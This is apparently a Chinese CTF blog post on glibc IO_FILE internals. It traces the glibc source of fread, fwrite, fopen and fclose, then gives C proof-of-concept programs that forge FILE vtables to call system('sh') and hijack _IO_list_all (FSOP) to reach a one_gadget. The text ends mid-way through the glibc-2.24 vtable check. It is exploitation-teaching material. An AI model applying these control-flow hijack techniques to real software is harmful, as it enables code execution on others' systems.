---
title: IO_FILE in CTF
date: 2020-04-19 14:44:34
tags: [ctf, pwn]
---

记录 IO_FILE 相关知识。

<!-- more -->

# FILE Structure

FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 `fopen` 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 相关的结构定义在 [glibc/libio/libio.h](https://code.woboq.org/userspace/glibc/libio/libio.h.html) 中：

```cpp
struct _IO_FILE {
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

进程中的 FILE 结构会通过 `_chain` 域彼此连接形成一个链表，链表头部用全局变量 `_IO_list_all` 表示，通过这个值可以遍历所有的 FILE 结构。在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，`_IO_list_all` 指向了一个有这些文件流构成的链表，这三个文件流位于 libc.so 的数据段；而使用 `fopen` 创建的文件流是分配在堆内存上的。

```bash
$ strings /lib/x86_64-linux-gnu/libc.so.6 | grep -E "stdin|stdout|stderr"
stderr
_IO_2_1_stderr_
_IO_2_1_stdout_
stdout
_IO_2_1_stdin_
stdin
stdin
stdout
stderr
rcmd: write (setting up stderr): %m
rcmd: poll (setting up stderr): %m
```

而在 `_IO_FILE` 结构体外还有一层结构体叫做 `_IO_FILE_plus`（[glibc/libio/libioP.h](https://code.woboq.org/userspace/glibc/libio/libioP.h.html)），其中包含了一个指针 `vtable`，其指向了一系列函数（在 libc-2.23 下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8）：

```cpp
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

其中 `vtable` 是 `_IO_jump_t` 结构体，用于保存函数指针：

```cpp
#define JUMP_FIELD(TYPE, NAME) TYPE NAME
...
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

在 [glibc/libio/fileops.c](https://code.woboq.org/userspace/glibc/libio/fileops.c.html) 中可以看到一般情况下 vtable 表默认指向的各个函数：

```cpp
const struct _IO_jump_t _IO_file_jumps =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

## `fread()`

`fread()` 是标准 IO 库函数，作用是从文件流中读数据，在 [glibc/libio/iofread.c](https://code.woboq.org/userspace/glibc/libio/iofread.c.html) 中实现，实际函数名为 `_IO_fread`。其中 buf 为存放数据的缓冲区，size 指定一个数据项对应的字节数，count 指定读入数据的个数，fp 为目标文件流。一开始的 `CHECK_FILE` 就是检查一个 Magic Number，真正的读功能在 `_IO_sgetn` 中实现：

```cpp
_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```

`_IO_sgetn` 则在 [glibc/libio/genops.c](https://code.woboq.org/userspace/glibc/libio/genops.c.html) 中实现，其中调用了 `_IO_XSGETN`：

```cpp
_IO_size_t
_IO_sgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  /* FIXME handle putback buffer here! */
  return _IO_XSGETN (fp, data, n);
}
```

而 `_IO_XSGETN` 在 [glibc/libio/libio.h](https://code.woboq.org/userspace/glibc/libio/libio.h.html) 中实现。把宏一个一个展开来大概可以看出用于获取 vtable 对应的函数 `__xsgetn`：

```cpp
#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)
...
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)
...
#if _IO_JUMPS_OFFSET
# define _IO_JUMPS_FUNC(THIS) \
 (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS) \
			   + (THIS)->_vtable_offset))
# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset
#else
# define _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)
# define _IO_vtable_offset(THIS) 0
#endif
...
#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)
...
/* Essentially ((TYPE *) THIS)->MEMBER, but avoiding the aliasing
   violation in case THIS has a different pointer type.  */
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))
...
/* Type of MEMBER in struct type TYPE.  */
#define _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE){}).MEMBER)
```

而默认情况下这个指针是指向 `_IO_file_xsgetn` 的：

```cpp
_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
  _IO_size_t want, have;
  _IO_ssize_t count;
  char *s = data;

  want = n;

  if (fp->_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp->_IO_save_base != NULL)
	{
	  free (fp->_IO_save_base);
	  fp->_flags &= ~_IO_IN_BACKUP;
	}
      _IO_doallocbuf (fp);
    }

  while (want > 0)
    {
      have = fp->_IO_read_end - fp->_IO_read_ptr;
      if (want <= have)
	{
	  memcpy (s, fp->_IO_read_ptr, want);
	  fp->_IO_read_ptr += want;
	  want = 0;
	}
      else
	{
	  if (have > 0)
	    {
#ifdef _LIBC
	      s = __mempcpy (s, fp->_IO_read_ptr, have);
#else
	      memcpy (s, fp->_IO_read_ptr, have);
	      s += have;
#endif
	      want -= have;
	      fp->_IO_read_ptr += have;
	    }

	  /* Check for backup and repeat */
	  if (_IO_in_backup (fp))
	    {
	      _IO_switch_to_main_get_area (fp);
	      continue;
	    }

	  /* If we now want less than a buffer, underflow and repeat
	     the copy.  Otherwise, _IO_SYSREAD directly to
	     the user buffer. */
	  if (fp->_IO_buf_base
	      && want < (size_t) (fp->_IO_buf_end - fp->_IO_buf_base))
	    {
	      if (__underflow (fp) == EOF)
		break;

	      continue;
	    }

	  /* These must be set before the sysread as we might longjmp out
	     waiting for input. */
	  _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
	  _IO_setp (fp, fp->_IO_buf_base, fp->_IO_buf_base);

	  /* Try to maintain alignment: read a whole number of blocks.  */
	  count = want;
	  if (fp->_IO_buf_base)
	    {
	      _IO_size_t block_size = fp->_IO_buf_end - fp->_IO_buf_base;
	      if (block_size >= 128)
		count -= want % block_size;
	    }

	  count = _IO_SYSREAD (fp, s, count);
	  if (count <= 0)
	    {
	      if (count == 0)
		fp->_flags |= _IO_EOF_SEEN;
	      else
		fp->_flags |= _IO_ERR_SEEN;

	      break;
	    }

	  s += count;
	  want -= count;
	  if (fp->_offset != _IO_pos_BAD)
	    _IO_pos_adjust (fp->_offset, count);
	}
    }

  return n - want;
}
```

## `fwrite()`

`fwrite` 同样是标准 IO 库函数，作用是向文件流写入数据，在 [glibc/libio/iofwrite.c](https://code.woboq.org/userspace/glibc/libio/iofwrite.c.html) 中实现。其中 buf 为一个写入数据的缓冲区，size 为写入的一个数据项对应的字节数，count 为写入的数据总数，stream 为目标文件流：

```cpp
_IO_size_t
_IO_fwrite (const void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t request = size * count;
  _IO_size_t written = 0;
  CHECK_FILE (fp, 0);
  if (request == 0)
    return 0;
  _IO_acquire_lock (fp);
  if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
    written = _IO_sputn (fp, (const char *) buf, request);
  _IO_release_lock (fp);
  /* We have written all of the input in case the return value indicates
     this or EOF is returned.  The latter is a special case where we
     simply did not manage to flush the buffer.  But the data is in the
     buffer and therefore written as far as fwrite is concerned.  */
  if (written == request || written == EOF)
    return count;
  else
    return written / size;
}
```

主要功能在 `_IO_sputn` 中：

```cpp
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
```

和前面的 `fread` 同理，`fwrite` 最终获取到 vtable 对应的 `__xsputn` 成员所指向的函数 `_IO_file_xsputn`（`_IO_new_file_xsputn`），最终会调用系统接口 `write` 函数：

```cpp
# define _IO_new_file_xsputn _IO_file_xsputn
...
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  const char *s = (const char *) data;
  _IO_size_t to_do = n;
  int must_flush = 0;
  _IO_size_t count = 0;

  if (n <= 0)
    return 0;
  /* This is an optimized implementation.
     If the amount to be written straddles a block boundary
     (or the filebuf is unbuffered), use sys_write directly. */

  /* First figure out how much space is available in the buffer. */
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
	{
	  const char *p;
	  for (p = s + n; p > s; )
	    {
	      if (*--p == '\n')
		{
		  count = p - s + 1;
		  must_flush = 1;
		  break;
		}
	    }
	}
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
	count = to_do;
#ifdef _LIBC
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
#else
      memcpy (f->_IO_write_ptr, s, count);
      f->_IO_write_ptr += count;
#endif
      s += count;
      to_do -= count;
    }
  if (to_do + must_flush > 0)
    {
      _IO_size_t block_size, do_write;
      /* Next flush the (full) buffer. */
      if (_IO_OVERFLOW (f, EOF) == EOF)
	/* If nothing else has to be written we must not signal the
	   caller that everything has been written.  */
	return to_do == 0 ? EOF : n - to_do;

      /* Try to maintain alignment: write a whole number of blocks.  */
      block_size = f->_IO_buf_end - f->_IO_buf_base;
      do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);

      if (do_write)
	{
	  count = new_do_write (f, s, do_write);
	  to_do -= count;
	  if (count < do_write)
	    return n - to_do;
	}

      /* Now write out the remainder.  Normally, this will fit in the
	 buffer, but it's somewhat messier for line-buffered files,
	 so we let _IO_default_xsputn handle the general case. */
      if (to_do)
	to_do -= _IO_default_xsputn (f, s+do_write, to_do);
    }
  return n - to_do;
}
```

`printf` 和 `puts` 是常用的输出函数，在 `printf` 的参数是以 `'\n'` 结束的纯字符串时，`printf` 会被优化为 `puts` 函数并去除换行符。`puts` 在源码中实现的函数是 `_IO_puts`，这个函数的操作与 `fwrite` 的流程大致相同，函数内部同样会调用 vtable 中的 `_IO_sputn`，结果会执行 `_IO_new_file_xsputn`，最后会调用到系统接口 write 函数。而 `printf` 的调用栈回溯如下，同样是通过 `_IO_file_xsputn`（`_IO_new_file_xsputn`）实现：

```
vfprintf+11
_IO_file_xsputn
_IO_file_overflow
funlockfile
_IO_file_write
write
```

## `fopen()`

`fopen` 是一个在 [glibc/include/stdio.h](https://code.woboq.org/userspace/glibc/libio/stdio.h.html) 中实现的宏，在标准 IO 库中用于打开文件。其中 fname 指定文件路径，mode 指定打开方式的类型：

```cpp
#   define fopen(fname, mode) _IO_new_fopen (fname, mode)
```

对应的 `_IO_new_fopen` 在 [glibc/libio/iofopen.c](https://code.woboq.org/userspace/glibc/libio/iofopen.c.html) 中实现，其中主要调用了 `__fopen_internal` 函数：

```cpp
_IO_FILE *
_IO_new_fopen (const char *filename, const char *mode)
{
  return __fopen_internal (filename, mode, 1);
}
```

`__fopen_internal` 内部会调用 `malloc` 函数，分配 FILE 结构的空间，因此可以获知 FILE 结构是存储在堆上的。之后会为创建的 FILE 初始化 vtable，并调用 `_IO_file_init` 进一步初始化操作。之后调用 `_IO_file_fopen` 函数打开目标文件并根据用户传入的打开模式进行打开操作，最后会调用到系统接口 `open` 函数：

```cpp
_IO_FILE *
__fopen_internal (const char *filename, const char *mode, int is32)
{
  struct locked_FILE
  {
    struct _IO_FILE_plus fp;
#ifdef _IO_MTSAFE_IO
    _IO_lock_t lock;
#endif
    struct _IO_wide_data wd;
  } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));

  if (new_f == NULL)
    return NULL;
#ifdef _IO_MTSAFE_IO
  new_f->fp.file._lock = &new_f->lock;
#endif
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps);
#else
  _IO_no_init (&new_f->fp.file, 1, 0, NULL, NULL);
#endif
  _IO_JUMPS (&new_f->fp) = &_IO_file_jumps;
  _IO_file_init (&new_f->fp);
#if  !_IO_UNIFIED_JUMPTABLES
  new_f->fp.vtable = NULL;
#endif
  if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)
    return __fopen_maybe_mmap (&new_f->fp.file);

  _IO_un_link (&new_f->fp);
  free (new_f);
  return NULL;
}
```

在 `_IO_file_init` 函数的初始化操作中，会调用 `_IO_link_in` 把新分配的 FILE 链入 `_IO_list_all` 为起始的 FILE 链表中：

```cpp
# define _IO_new_file_init _IO_file_init
...
void
_IO_new_file_init (struct _IO_FILE_plus *fp)
{
  /* POSIX.1 allows another file handle to be used to change the position
     of our file descriptor.  Hence we actually don't know the actual
     position before we do the first fseek (and until a following fflush). */
  fp->file._offset = _IO_pos_BAD;
  fp->file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;

  _IO_link_in (fp);
  fp->file._fileno = -1;
}
...
_IO_link_in (struct _IO_FILE_plus *fp)
{
  if ((fp->file._flags & _IO_LINKED) == 0)
    {
      fp->file._flags |= _IO_LINKED;
#ifdef _IO_MTSAFE_IO
      _IO_cleanup_region_start_noarg (flush_cleanup);
      _IO_lock_lock (list_all_lock);
      run_fp = (_IO_FILE *) fp;
      _IO_flockfile ((_IO_FILE *) fp);
#endif
      fp->file._chain = (_IO_FILE *) _IO_list_all;
      _IO_list_all = fp;
      ++_IO_list_all_stamp;
#ifdef _IO_MTSAFE_IO
      _IO_funlockfile ((_IO_FILE *) fp);
      run_fp = NULL;
      _IO_lock_unlock (list_all_lock);
      _IO_cleanup_region_end (0);
#endif
    }
}
```

最终可以得出 fopen 的操作如下：

- 使用 `malloc` 分配 FILE 结构
- 设置 FILE 结构的 vtable
- 初始化分配的 FILE 结构
- 将初始化的 FILE 结构链入 FILE 结构链表中
- 调用系统调用打开文件

## `fclose()`

`fclose` 是标准 IO 库中用于关闭已打开文件的函数，在 [glibc/include/iofclose.c](https://code.woboq.org/userspace/glibc/libio/iofclose.c.html)，宏定义如下。其中 fp 为已经打开的文件流：

```cpp
#   define fclose(fp) _IO_new_fclose (fp)
```

`fclose` 首先会调用 `_IO_un_link` 将指定的 FILE 从 `_chain` 链表中脱链。之后会调用 `_IO_file_close_it` 函数，`_IO_file_close_it` 会调用系统接口 `close` 关闭文件。最后调用 vtable 中的 `_IO_FINISH`，其对应的是 `_IO_file_finish` 函数，其中会调用 `free` 函数释放之前分配的 FILE 结构：

```cpp
int
_IO_new_fclose (_IO_FILE *fp)
{
  int status;

  CHECK_FILE(fp, EOF);

#if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
  /* We desperately try to help programs which are using streams in a
     strange way and mix old and new functions.  Detect old streams
     here.  */
  if (_IO_vtable_offset (fp) != 0)
    return _IO_old_fclose (fp);
#endif

  /* First unlink the stream.  */
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    _IO_un_link ((struct _IO_FILE_plus *) fp);

  _IO_acquire_lock (fp);
  if (fp->_IO_file_flags & _IO_IS_FILEBUF)
    status = _IO_file_close_it (fp);
  else
    status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
  _IO_release_lock (fp);
  _IO_FINISH (fp);
  if (fp->_mode > 0)
    {
#if _LIBC
      /* This stream has a wide orientation.  This means we have to free
	 the conversion functions.  */
      struct _IO_codecvt *cc = fp->_codecvt;

      __libc_lock_lock (__gconv_lock);
      __gconv_release_step (cc->__cd_in.__cd.__steps);
      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
#endif
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}
...
void
_IO_un_link (struct _IO_FILE_plus *fp)
{
  if (fp->file._flags & _IO_LINKED)
    {
      struct _IO_FILE **f;
#ifdef _IO_MTSAFE_IO
      _IO_cleanup_region_start_noarg (flush_cleanup);
      _IO_lock_lock (list_all_lock);
      run_fp = (_IO_FILE *) fp;
      _IO_flockfile ((_IO_FILE *) fp);
#endif
      if (_IO_list_all == NULL)
	;
      else if (fp == _IO_list_all)
	{
	  _IO_list_all = (struct _IO_FILE_plus *) _IO_list_all->file._chain;
	  ++_IO_list_all_stamp;
	}
      else
	for (f = &_IO_list_all->file._chain; *f; f = &(*f)->_chain)
	  if (*f == (_IO_FILE *) fp)
	    {
	      *f = fp->file._chain;
	      ++_IO_list_all_stamp;
	      break;
	    }
      fp->file._flags &= ~_IO_LINKED;
#ifdef _IO_MTSAFE_IO
      _IO_funlockfile ((_IO_FILE *) fp);
      run_fp = NULL;
      _IO_lock_unlock (list_all_lock);
      _IO_cleanup_region_end (0);
#endif
    }
}
...
# define _IO_new_file_close_it _IO_file_close_it
...
int
_IO_new_file_close_it (_IO_FILE *fp)
{
  int write_status;
  if (!_IO_file_is_open (fp))
    return EOF;

  if ((fp->_flags & _IO_NO_WRITES) == 0
      && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)
    write_status = _IO_do_flush (fp);
  else
    write_status = 0;

  _IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);

  /* Free buffer. */
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  if (fp->_mode > 0)
    {
      if (_IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);
      _IO_wsetb (fp, NULL, NULL, 0);
      _IO_wsetg (fp, NULL, NULL, NULL);
      _IO_wsetp (fp, NULL, NULL);
    }
#endif
  _IO_setb (fp, NULL, NULL, 0);
  _IO_setg (fp, NULL, NULL, NULL);
  _IO_setp (fp, NULL, NULL);

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
}
...
#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
...
# define _IO_new_file_finish _IO_file_finish
...
void
_IO_new_file_finish (_IO_FILE *fp, int dummy)
{
  if (_IO_file_is_open (fp))
    {
      _IO_do_flush (fp);
      if (!(fp->_flags & _IO_DELETE_DONT_CLOSE))
	_IO_SYSCLOSE (fp);
    }
  _IO_default_finish (fp, 0);
}
```

# Vulnerabilities

## Forge Vtable to Control PC

伪造 vtable 劫持程序流程的中心思想就是针对 `_IO_FILE_plus` 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。直接修改 vtable 的方法测试了一下在 glibc-2.19 也不能成功，测试程序的 vtable 正好落在 libc 的数据段上，是只读的：

```cpp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define system_ptr 0x00007ffff7a0d000+0x45390

int main() {
    FILE *fp;
    uint64_t *vtable_ptr;
    fp = fopen("1.txt", "rw");
    if (!fp) {
        printf("file not existed.\n");
        exit(-1);
    }
    vtable_ptr = *(uint64_t *)((uint64_t)fp + 0xd8);
    memcpy(fp, "sh", 3);
    vtable_ptr[7] = system_ptr; // __xsputn
    fwrite("X", 1, 1, fp);
    return 0;
}
```

在可控区域伪造一个 vtable 来替换原来的 vtable 是可行的：

```cpp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define system_ptr 0x00007ffff7a0d000+0x45390

int main() {
    FILE *fp;
    uint64_t *vtable_addr, *fake_vtable;
    fp = fopen("1.txt", "rw");
    if (!fp) {
        printf("file not existed.\n");
        exit(-1);
    }
    fake_vtable = malloc(0x40);
    vtable_addr = (uint64_t *)((uint64_t)fp + 0xd8);
    vtable_addr[0] = (uint64_t)fake_vtable;
    memcpy(fp, "sh", 3);
    fake_vtable[7] = system_ptr; // __xsputn
    fwrite("X", 1, 1, fp);
    return 0;
}
```

## File Stream Oriented Programming（FSOP）

FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的 `_IO_FILE` 结构会使用 `_chain` 域相互连接形成一个链表，这个链表的头部由 `_IO_list_all` 维护。FSOP 的核心思想就是劫持 `_IO_list_all` 的值来伪造链表和其中的 `_IO_FILE` 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 `_IO_flush_all_lockp`，这个函数会刷新 `_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用 `_IO_FILE_plus.vtable` 中的 `_IO_overflow`。

```cpp
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
	_IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
	   || (_IO_vtable_offset (fp) == 0
	       && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
				    > fp->_wide_data->_IO_write_base))
#endif
	   )
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;

      if (do_lock)
	_IO_funlockfile (fp);
      run_fp = NULL;

      if (last_stamp != _IO_list_all_stamp)
	{
	  /* Something was added to the list.  Start all over again.  */
	  fp = (_IO_FILE *) _IO_list_all;
	  last_stamp = _IO_list_all_stamp;
	}
      else
	fp = fp->_chain;
    }

#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif

  return result;
}
```

`_IO_flush_all_lockp` 函数不需要手动调用，在一些情况下这个函数会被系统调用：

- 当 libc 执行 abort 流程时
- 当执行 `exit` 函数时
- 当执行流从 `main` 函数返回时

`_IO_list_all` 作为 libc 中的全局变量，需要获取 libc 基址才能得到 `_IO_list_all` 的地址。要实现 FSOP，还需要使构造的 FILE 能够正常工作，也就是需要 `fp->_mode` 的值为 0，`fp->_IO_write_ptr` 要大于 `fp->_IO_write_base`：

```cpp
if ((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
	  && _IO_OVERFLOW (fp, EOF) == EOF)
	result = EOF;
```

伪造 `_IO_list_all` 和 `vtable`，最后 `exit` 时会 Call 到构造的 `_IO_overflow` 上：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define _IO_list_all 0x7ffff7dd2520
#define mode_offset 0xc0
#define write_ptr_offset 0x28
#define write_base_offset 0x20
#define vtable_offset 0xd8
#define one_gadget 0x7ffff7a0d000+0xf02a4

int main() {
    void *ptr, *fake_vtable;
    uint64_t *list_all_ptr;
    ptr = malloc(0x200);
    fake_vtable = (uint64_t)ptr + 0x100;

    *(uint64_t *)((uint64_t)ptr + mode_offset) = 0;
    *(uint64_t *)((uint64_t)ptr + write_ptr_offset) = 1;
    *(uint64_t *)((uint64_t)ptr + write_base_offset) = 0;
    *(uint64_t *)((uint64_t)ptr + vtable_offset) = (uint64_t)ptr + 0x100;
    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget;

    list_all_ptr = (uint64_t *)_IO_list_all;
    list_all_ptr[0] = ptr;
    exit(0);
}
```

## Attack with IO_FILE >= glibc-2.24

从 glibc-2.24 起，加入了针对 `_IO_FILE_plus->vtable` 的检查，在调用虚函数时会首先检查 vtable 地址的合法性。先验证 vtable 是否在 `_IO_vtable` 段中，如果满足条件就正常执行；否则调用 `_IO_vtable_check` 进一步检查。具体验证通过计算 `__stop___libc_IO_vtables - __start___libc_IO_vtables` 的值 `section_length`，然后获取 vtable 到 `__start___libc_IO_vtables` 的偏移 `offset`，若 `offset` 大于等于 `section_length` 就会调用 `_IO_vtable_check`：

```cpp
/* Check if unknown vtable pointers are permitted; otherwise,
   terminate the process.  */
void _IO_vtable_check (void) attribute_hidden;

/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

在 `_IO_vtable_check` 中，会具体检查 vtable 是否合法：

```cpp
void attribute_hidden
_IO_vtable_check (void)
{
#ifdef SHARED
  /* Honor the compatibility flag.  */
  void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (flag);
#endif
  if (flag == &_IO_vtable_check)
    return;

  /* In case this libc copy is in a non-default namespace, we always
     need to accept foreign vtables because there is always a
     possibility that FILE * objects are passed across the linking
     boundary.  */
  {
    Dl_info di;
    struct link_map *l;
    if (!rtld_active ()
        || (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
            && l->l_ns != LM_ID_BASE))
      return;
  }

#else /* !SHARED */
  /* We cannot perform vtable validation in the static dlopen case
     because FILE * handles might be passed back and forth across the
